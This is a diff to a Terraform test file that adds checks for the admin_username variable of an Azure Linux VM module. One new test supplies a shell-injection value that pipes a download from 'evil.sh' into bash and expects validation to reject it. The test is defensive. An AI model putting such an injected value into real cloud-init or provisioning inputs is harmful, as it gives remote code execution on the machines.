@@ -318,6 +318,31 @@ run "kill_switch_disables_everything" {
   }
 }
 
+# ── admin_username은 cloud-init 셸 명령에 이스케이프 없이 보간된다 — 메타문자를
+#    plan 단계에서 거부해야 한다(2026-09-04 code-review 발견) ──────────────────────
+run "reject_admin_username_with_shell_metacharacters" {
+  command = plan
+
+  variables {
+    admin_username = "ops\"; curl evil.sh | bash; echo \""
+  }
+
+  expect_failures = [var.admin_username]
+}
+
+run "admin_username_custom_value_ok" {
+  command = plan
+
+  variables {
+    admin_username = "ops-admin_01"
+  }
+
+  assert {
+    condition     = length(azurerm_linux_virtual_machine.this) == 1
+    error_message = "Linux 계정명 관례를 지키는 admin_username인데 plan이 통과하지 않았다."
+  }
+}
+
 # ── nullable = false 계약: 명시적 null이 crash 대신 default로 대체된다 ─────────
 run "nullable_false_falls_back_to_default" {
   command = plan
